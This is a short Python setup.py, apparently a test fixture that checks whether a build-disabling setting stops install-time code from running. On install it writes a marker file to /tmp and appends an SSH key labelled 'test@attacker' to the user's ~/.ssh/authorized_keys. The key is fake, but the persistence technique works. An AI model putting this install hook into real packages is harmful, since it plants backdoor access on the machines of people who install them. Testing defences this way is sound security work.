"""
Simulates persistence via setup.py: writes SSH key to authorized_keys.
If no-build=true works, this file never executes.
"""
import os

with open("/tmp/marker-python-persistence", "w") as f:
    f.write("SETUP_PY_PERSISTENCE_ATTEMPTED\n")

# Simulate SSH key injection
ssh_dir = os.path.expanduser("~/.ssh")
os.makedirs(ssh_dir, exist_ok=True)
auth_keys = os.path.join(ssh_dir, "authorized_keys")
with open(auth_keys, "a") as f:
    f.write("ssh-ed25519 AAAA_FAKE_PYTHON_TEST_KEY test@attacker\n")

from setuptools import setup
setup(
    name="test-setup-persistence",
    version="1.0.0",
    packages=["persist_pkg"],
)
